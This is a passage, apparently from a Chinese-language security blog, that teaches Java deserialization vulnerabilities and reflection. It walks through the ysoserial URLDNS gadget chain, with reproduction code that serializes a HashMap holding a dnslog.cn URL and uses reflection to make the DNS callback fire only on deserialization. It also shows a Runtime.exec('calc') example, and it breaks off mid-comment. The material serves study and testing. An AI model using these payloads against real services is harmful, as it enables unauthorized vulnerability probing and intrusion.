class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        <span class="hljs-type">URL</span> <span class="hljs-variable">u</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://w9ge5j.dnslog.cn&quot;</span>);<br>        hash.put(u, <span class="hljs-number">1</span>);<br><br>        serializableTest(hash);<br>        unserializableTest(<span class="hljs-string">&quot;dns.txt&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">// 序列化</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serializableTest</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;dns.txt&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br><br>    <span class="hljs-comment">// 反序列化</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserializableTest</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> o;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311752489.png" srcset="/img/loading.gif" lazyload></p>
+<p><code>URL</code> 类在 JDK 里是自带的类，它的 <code>hashCode()</code> 方法里会触发 DNS 解析  </p>
+<p> 入口参数里包含了可控的类（<code>URL</code>），而该类在反序列化过程中会自动调用危险方法（<code>hashCode()</code> 触发 DNS 解析），那么在 <code>readObject()</code> 反序列化时就会执行这些危险逻辑，造成安全风险。  </p>
+<h4 id="HashMap-找入口类分析："><a href="#HashMap-找入口类分析：" class="headerlink" title="HashMap 找入口类分析："></a>HashMap 找入口类分析：</h4><p>本例中的代码利用了 <font style="color:#080808;background-color:#ffffff;">HashMap&lt;URL, Integer&gt;</font>，那么看看为什么它会造成漏洞</p>
+<p>跟进 HashMap ，此处继承了 <font style="color:#080808;background-color:#ffffff;">Serializable</font></p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311752099.png" srcset="/img/loading.gif" lazyload></p>
+<p>找到重写的 readObject</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311752120.png" srcset="/img/loading.gif" lazyload></p>
+<p>跟进 hash</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311752777.png" srcset="/img/loading.gif" lazyload></p>
+<p>跟进 hashCode,<font style="color:rgb(80, 80, 92);">hashCode 位置处于 Object 类当中</font></p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311752211.png" srcset="/img/loading.gif" lazyload></p>
+<p>这样，HashMap 完美满足了可序列化、重写 readObject、接收任意对象作为参数、JDK 自带的入口类条件。</p>
+<h3 id="1-5-3-入口类参数中包含可控类，该类又调用其他有危险方法的类，readObject-时调用"><a href="#1-5-3-入口类参数中包含可控类，该类又调用其他有危险方法的类，readObject-时调用" class="headerlink" title="1.5.3 入口类参数中包含可控类，该类又调用其他有危险方法的类，readObject 时调用"></a><font style="color:rgb(51, 51, 51);">1.5.3 入口类参数中包含可控类，该类又调用其他有危险方法的类，readObject 时调用</font></h3><h3 id="1-5-4-构造函数-静态代码块等类加载时隐式执行"><a href="#1-5-4-构造函数-静态代码块等类加载时隐式执行" class="headerlink" title="1.5.4 构造函数&#x2F;静态代码块等类加载时隐式执行"></a><font style="color:rgb(51, 51, 51);">1.5.4 构造函数&#x2F;静态代码块等类加载时隐式执行</font></h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>    	 <span class="hljs-keyword">try</span> &#123;<br>                Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>            &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>            &#125;<br>&#125;  <br><br><span class="hljs-comment">//对obj对象进行输出 默认调用原始对象的toString 方法</span><br>System.out.println(obj);<br></code></pre></td></tr></table></figure>
+
+<p> 在 <code>toString()</code> 中写入危险逻辑，那么只要对象在打印时被隐式调用，就会自动执行恶意代码  </p>
+<h2 id="1-6-找漏洞的三个条件"><a href="#1-6-找漏洞的三个条件" class="headerlink" title="1.6 找漏洞的三个条件"></a>1.6 找漏洞的三个条件</h2><p>首先一个前提：<strong><font style="color:rgb(80, 80, 92);">继承了 </font></strong><font style="color:#080808;background-color:#ffffff;">Serializable</font><font style="color:rgb(80, 80, 92);">，使对象可序列化</font></p>
+<ul>
+<li>入口类 source	<ul>
+<li>可序列化</li>
+<li>重写 readObject 调用常见函数</li>
+<li>接收任意对象作为参数，参数类型宽泛</li>
+<li>最后 JDK 自带</li>
+</ul>
+</li>
+<li>调用链 gadget chain</li>
+<li>执行类 sink <ul>
+<li><font style="color:rgb(80, 80, 92);">RCE SSRF 写文件等等</font></li>
+</ul>
+</li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311752309.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="2、Java-反射-URLDNS-链"><a href="#2、Java-反射-URLDNS-链" class="headerlink" title="2、Java 反射+URLDNS 链"></a><font style="color:rgb(76, 76, 87);">2、Java 反射+URLDNS 链</font></h1><h2 id="2-1-Java-反射理解"><a href="#2-1-Java-反射理解" class="headerlink" title="2.1 Java 反射理解"></a>2.1 Java 反射理解</h2><blockquote>
+<p><font style="color:rgb(37, 41, 51);">谈谈Java反射：从入门到实践，再到原理</font></p>
+<p><a target="_blank" rel="noopener" href="https://juejin.cn/post/6844904025607897096">https://juejin.cn/post/6844904025607897096</a></p>
+</blockquote>
+<p>反射的作用：让 Java 具有动态性</p>
+<h3 id="2-1-1-静态语言-VS-动态语言"><a href="#2-1-1-静态语言-VS-动态语言" class="headerlink" title="2.1.1 静态语言 VS 动态语言"></a>2.1.1 静态语言 VS 动态语言</h3><p>Java 本身使一种静态语言，编译时就决定了类型：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//编译器认为 student 的类型是 Student，</span><br><span class="hljs-type">Student</span> <span class="hljs-variable">student</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>();<br></code></pre></td></tr></table></figure>
+
+<p>而动态语言，比如PHP：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$var</span> = <span class="hljs-string">&quot;hello&quot;</span>;  <span class="hljs-comment">// 此时 $var 是字符串</span><br><span class="hljs-variable">$var</span> = <span class="hljs-number">123</span>;      <span class="hljs-comment">// 运行时再赋值，现在 $var 就是整数</span><br></code></pre></td></tr></table></figure>
+
+<p>再次对比：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311753866.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311753415.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="2-1-2-正射与反射"><a href="#2-1-2-正射与反射" class="headerlink" title="2.1.2 正射与反射"></a><font style="color:rgb(76, 76, 87);">2.1.2 正射与反射</font></h3><p><a target="_blank" rel="noopener" href="https://docs.oracle.com/javase/8/docs/technotes/guides/reflection/index.html">官方对反射的解释</a></p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311753682.png" srcset="/img/loading.gif" lazyload></p>
+<p><strong>反射机制</strong>使Java代码能够探查已加载类的字段、方法及构造函数信息，并在安全限制范围内，通过反射字段、方法和构造函数对这些底层对应元素进行操作。该 API 既支持需要访问目标对象公共成员（基于其运行时类）的应用程序，也支持访问给定类声明成员的场景，同时允许程序抑制默认的反射访问控制。</p>
+<p><strong>正射（直接调用）：在未运行时（编译时）已经知道了要运行的类</strong> <strong>Student</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311753359.png" srcset="/img/loading.gif" lazyload></p>
+<p><strong>反射：在运行的时候 forName 从 className&#x3D;”com.demo02.Student” 加载 Student 类，再去调用方法</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311754403.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="2-1-3-Class-对象理解"><a href="#2-1-3-Class-对象理解" class="headerlink" title="2.1.3 Class 对象理解"></a>2.1.3 Class 对象理解</h3><p><font style="color:rgb(37, 41, 51);"> 先理解 ：</font><strong><font style="color:rgb(37, 41, 51);">RTTI（Run-Time Type Identification）运行时类型识别</font></strong></p>
+<p>Java 在运行时识别对象和类的信息主要以俩种方式：一种是 RTTI ，它假定我们在编译期已知道了所有类型；另一种是 反射，在运行时发现和使用类的信息。</p>
+<p><strong><font style="color:rgb(37, 41, 51);">每个类都有一个Class对象</font></strong><font style="color:rgb(37, 41, 51);">，每当编译一个新类就产生一个Class对象（更恰当地说，是被保存在一个同名的.class文件中）。</font></p>
+<p><font style="color:rgb(37, 41, 51);">比如创建一个Student类，那么，JVM就会创建一个Student对应Class类的Class对象，该Class对象保存了Student类相关的类型信息。</font></p>
+<p><strong><font style="color:rgb(37, 41, 51);">Class类的对象作用</font></strong><font style="color:rgb(37, 41, 51);">是运行时提供或获得某个对象的类型信息</font></p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311754008.webp" srcset="/img/loading.gif" lazyload></p>
+<h2 id="2-2-反射使用"><a href="#2-2-反射使用" class="headerlink" title="2.2 反射使用"></a>2.2 反射使用</h2><h3 id="2-2-1-反射中极为重要的方法"><a href="#2-2-1-反射中极为重要的方法" class="headerlink" title="2.2.1 反射中极为重要的方法"></a>2.2.1 反射中极为重要的方法</h3><ul>
+<li>获取类的方法：forName</li>
+<li>实例化类对象的方法：newInstance</li>
+<li>获取函数的方法：getMethod</li>
+<li>执行函数的方法：invoke</li>
+</ul>
+<h3 id="2-2-2-获取-Class-类对象"><a href="#2-2-2-获取-Class-类对象" class="headerlink" title="2.2.2 获取 Class 类对象"></a>2.2.2 获取 Class 类对象</h3><ul>
+<li>已知<strong>具体的类</strong>，通过类的 <strong>class</strong> 属性获取，</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Person.class;<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>已知某个<strong>类的实例</strong>，调用该实例的 **getClass() **方法获取 Class 对象</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> person.getClass();<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>已知一个<strong>类的全类名</strong>，且该类在类路径下，可通过 Class 类的<strong>静态方法 forName()</strong> 获取，可能抛出 ClassNotFoundException</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;demo01.Student&quot;</span>);<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.reflection;<br><br><span class="hljs-comment">//测试 class 类的创建方式有哪些</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test03</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException &#123;<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>();<br>        System.out.println(<span class="hljs-string">&quot;这个人是：&quot;</span>+person.name);<br><br>        <span class="hljs-comment">//方式一：通过对象获得</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c1</span> <span class="hljs-operator">=</span> person.getClass();<br>        System.out.println(c1.hashCode());<br><br>        <span class="hljs-comment">//方式二：foename 获得</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c2</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.kuang.reflection.Student&quot;</span>);<br>        System.out.println(c2.hashCode());<br><br>        <span class="hljs-comment">//方式三：通过类名 .class 获得</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c3</span> <span class="hljs-operator">=</span> Student.class;<br>        System.out.println(c3.hashCode());<br><br>        <span class="hljs-comment">//方式四：基本内置类型的包装类都有一个 Type 属性</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c4</span> <span class="hljs-operator">=</span> Integer.TYPE;<br>        System.out.println(c4);<br><br>        <span class="hljs-comment">//获得父类类型</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c5</span> <span class="hljs-operator">=</span> c1.getSuperclass();<br>        System.out.println(c5);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    String name;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Person&#123;&quot;</span> +<br>        <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>        <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = <span class="hljs-string">&quot;student&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Teacher</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Teacher</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = <span class="hljs-string">&quot;Teacher&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="2-2-3-实例化-创建对象"><a href="#2-2-3-实例化-创建对象" class="headerlink" title="2.2.3 实例化&#x2F;创建对象"></a>2.2.3 实例化&#x2F;创建对象</h3><blockquote>
+<p>因为 Class 类是 <code>private</code> 私有属性，我们也无法通过创建对象的方式来获取 class 对象</p>
+</blockquote>
+<ul>
+<li>通过 Class 的 **newInstance() **方法</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//newInstance 不能传参</span><br><span class="hljs-type">Person</span> <span class="hljs-variable">p1</span> <span class="hljs-operator">=</span> (Person) c.newInstance();<br>System.out.println(p1);<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>通过 Constructor 的 newInstance() 方法</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// getConstructor(Class&lt;?&gt;... parameterTypes)</span><br><span class="hljs-type">Constructor</span> <span class="hljs-variable">personconstructor</span> <span class="hljs-operator">=</span> c.getConstructor(String.class, <span class="hljs-type">int</span>.class);<br><span class="hljs-type">Person</span> <span class="hljs-variable">p2</span> <span class="hljs-operator">=</span> (Person) personconstructor.newInstance(<span class="hljs-string">&quot;asd&quot;</span>, <span class="hljs-number">11</span>);<br>System.out.println(p2);<br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311755212.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="2-2-3-获取类里面的属性-Filed"><a href="#2-2-3-获取类里面的属性-Filed" class="headerlink" title="2.2.3 获取类里面的属性 Filed"></a>2.2.3 获取类里面的属性 Filed</h3><ul>
+<li>getField(<font style="color:#080808;background-color:#ffffff;">String name</font>)：指定变量名，可获得 public 类型的属性</li>
+<li>getFields()：获得类的 public 类型的属性</li>
+<li>getDeclaredField(<font style="color:#080808;background-color:#ffffff;">String name</font>)：指定变量名，可获得所有类型的属性</li>
+<li>getDeclaredFields()：获得类的所有类型的属性</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//获取类里面的属性</span><br>Field[] personfields1 = c.getFields();<br><span class="hljs-keyword">for</span> (Field field : personfields1) &#123;<br>    System.out.println(field);<br>&#125;<br><br>System.out.println(<span class="hljs-string">&quot;==================================&quot;</span>);<br><br>Field[] personfields2 = c.getDeclaredFields();<br><span class="hljs-keyword">for</span> (Field field : personfields2) &#123;<br>    System.out.println(field);<br>&#125;<br><br>System.out.println(<span class="hljs-string">&quot;==================================&quot;</span>);<br><br><span class="hljs-type">Field</span> <span class="hljs-variable">idfield</span> <span class="hljs-operator">=</span> c.getField(<span class="hljs-string">&quot;id&quot;</span>);<br>System.out.println(idfield);<br><br>System.out.println(<span class="hljs-string">&quot;==================================&quot;</span>);<br><br><span class="hljs-type">Field</span> <span class="hljs-variable">allfield</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;age&quot;</span>);<br>System.out.println(allfield);<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311755559.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="2-2-4-获取类的方法-Method"><a href="#2-2-4-获取类的方法-Method" class="headerlink" title="2.2.4 获取类的方法 Method"></a>2.2.4 获取类的方法 Method</h3><ul>
+<li>getMethod(String name, Class&lt;?&gt;… parameterTypes)：指定方法名和参数类型，可获得 public 方法（包含父类继承的）。</li>
+<li>getMethods()：获得类及父类的所有 public 方法。</li>
+<li>getDeclaredMethod(String name, Class&lt;?&gt;… parameterTypes)：指定方法名和参数类型，可获得本类声明的任意方法（包括 private、protected、默认、public）。</li>
+<li>getDeclaredMethods()：获得类中声明的所有方法（不含父类）。</li>
+</ul>
+<h3 id="2-2-5-获取类的构造器-Constructor"><a href="#2-2-5-获取类的构造器-Constructor" class="headerlink" title="2.2.5 获取类的构造器 Constructor"></a>2.2.5 获取类的构造器 Constructor</h3><ul>
+<li>getConstructor(Class&lt;?&gt;… parameterTypes)：指定参数类型，可获得 public 构造器。</li>
+<li>getConstructors()：获得类的所有 public 构造器。</li>
+<li>getDeclaredConstructor(Class&lt;?&gt;… parameterTypes)：指定参数类型，可获得类的任意构造器（包括 private）。</li>
+<li>getDeclaredConstructors()：获得类的所有构造器（不论修饰符）。</li>
+</ul>
+<h2 id="2-3-URLDNS-链"><a href="#2-3-URLDNS-链" class="headerlink" title="2.3 URLDNS 链"></a>2.3 URLDNS 链</h2><p><a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java">https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java</a></p>
+<p>URLDNS 是  ysoserial 中的一个利用链：</p>
+<ul>
+<li><p>Gadget Chain:</p>
+</li>
+<li><pre><code class="hljs">HashMap.readObject()
+</code></pre>
+</li>
+<li><pre><code class="hljs">  HashMap.putVal()
+</code></pre>
+</li>
+<li><pre><code class="hljs">    HashMap.hash()
+</code></pre>
+</li>
+<li><pre><code class="hljs">      URL.hashCode()
+</code></pre>
+</li>
+</ul>
+<h3 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h3><p>首先是因为 HashMap（java&#x2F;util&#x2F;HashMap.java） 中重写了 readObject() 方法，HashMap.readObject() 通过 <font style="color:#080808;background-color:#ffffff;">K key &#x3D; (K) s.readObject(); 进行反序列化，之后调用  putVal() -&gt; hash()，在 hash() 中调用了 hashCode() ；【关于 HashMap 的分析：</font><a href="#KmszU">HashMap 找入口类分析</a><font style="color:#080808;background-color:#ffffff;">】</font></p>
+<p><font style="color:#080808;background-color:#ffffff;">接下来查看 URL（java&#x2F;net&#x2F;URL.java），URL 中继承了 </font><strong><font style="color:#080808;background-color:#ffffff;">Serializable，</font></strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311755415.png" srcset="/img/loading.gif" lazyload></p>
+<p>跟进 hashCode</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311755653.png" srcset="/img/loading.gif" lazyload></p>
+<p><code>getHostAddress(u)</code> 会尝试把 URL 中的主机名解析成一个 <code>InetAddress</code> 对象（也就是 IP 地址）， 如果主机名解析成功（<code>addr</code> 不为 null），就把解析出来的 IP 地址的 <code>hashCode()</code> 加入到 <code>h</code>（整个 URL 的哈希值）里  ； 如果 DNS 没解析成功（<code>addr == null</code>），那就直接取 URL 原始的 <code>host</code> 字符串  </p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311755421.png" srcset="/img/loading.gif" lazyload></p>
+<p>跟进 getHostAddress，<font style="color:#080808;background-color:#ffffff;">InetAddress.getByName(host)方法会去解析主机名，</font></p>
+<ul>
+<li>如果 <code>host</code> 是 IP 地址，直接转换成 <code>InetAddress</code>，不会走 DNS</li>
+<li>如果 <code>host</code> 是域名，这里就会向系统的 <strong>DNS 解析器</strong> 发起请求，解析成 IP</li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311756610.png" srcset="/img/loading.gif" lazyload></p>
+<hr>
+<hr>
+<p><strong>完整的利用链：</strong></p>
+<p> HashMap.readObject()</p>
+<p>-&gt; HashMap.putVal()</p>
+<p>-&gt; HashMap.hash()</p>
+<p>-&gt; URL.hashCode()</p>
+<p>-&gt; <font style="color:#080808;background-color:#ffffff;">URLStreamHandler.hashCode()</font></p>
+<p>-&gt; <font style="color:#080808;background-color:#ffffff;">URLStreamHandler.hashCode.</font>getHostAddress()</p>
+<p>-&gt; getHostAddress.<font style="color:#080808;background-color:#ffffff;">InetAddress.getByName()  【这里发出 DNS 请求】</font></p>
+<h3 id="复现："><a href="#复现：" class="headerlink" title="复现："></a>复现：</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">HashMap&lt;URL,Integer&gt; hashmap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;URL,Integer&gt;();<br>hashmap.put(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://9zuzrq.dnslog.cn&quot;</span>),<span class="hljs-number">1</span>);<br>serialize(hashmap);<br></code></pre></td></tr></table></figure>
+
+<p>首先执行序列化，发现触发了dns 请求？</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311756014.png" srcset="/img/loading.gif" lazyload></p>
+<p>回到源码中：当 hashCode 不为 -1 时，直接返回 hashCode，不再执行下面代码</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311756302.png" srcset="/img/loading.gif" lazyload></p>
+<p>我们知道，第一次将 key（也就是 dnslog）传入 URL.hashCode 时，hashCode &#x3D;&#x3D; -1（-1 表示没有计算过），执行 hashCode &#x3D; handler.hashCode(this); ，而根据之前的分析，  handler.hashCode  -&gt; getHostAddress -&gt; InetAddress.getByName(host) -&gt; 发起dns请求，所以说，序列化本身没有发起 dns请求，是因为 HashMap 在序列化过程中调用了 URL.hashCode() ，URL.hashCode() 解析主机名发起 DNS 请求。</p>
+<p>那么如何不在第一次发起请求？</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java">HashMap&lt;URL,Integer&gt; hashmap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;URL,Integer&gt;();<br><span class="hljs-comment">//这里不使用 put</span><br><span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://yjgubh.dnslog.cn&quot;</span>);<br><span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> url.getClass();<br><span class="hljs-type">Field</span> <span class="hljs-variable">hashcodefield</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;hashCode&quot;</span>);<br>hashcodefield.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-comment">//人为修改 URL.hashCode 缓存值，</span><br>hashcodefield.set(url,<span class="hljs-number">12134</span>);<br><span class="hljs-comment">//由于 hashCode != -1，它直接返回 12134，不会触发 DNS，只是把 URL 当 key 存进去</span><br><span class="hljs-comment">//存进去之后：此时 HashMap 内部只记录：key = URL(&quot;http://xx.dnslog.cn&quot;);key 的 hash 值 = 12134;value = 1</span><br>hashmap.put(url,<span class="hljs-number">1</span>);<br><span class="hljs-comment">//反序列化之前把 hashcode 改回 -1,恢复 